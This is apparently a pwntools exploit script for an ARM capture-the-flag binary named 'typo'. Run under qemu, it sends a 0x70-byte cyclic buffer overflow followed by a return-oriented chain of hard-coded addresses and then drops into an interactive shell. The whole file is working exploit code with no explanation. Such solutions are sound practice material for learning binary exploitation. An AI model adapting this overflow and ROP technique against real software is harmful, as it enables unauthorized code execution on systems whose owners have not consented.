from pwn import *
context.arch='arm'
context.log_level='debug'

io = process(['qemu-arm-static', './typo'])
io.sendafter(b'quit\n', b'\n')
io.send(cyclic(0x70) + p32(0x20904) + p32(0x6c384) + p32(0) + p32(0x10ba8))

io.interactive()
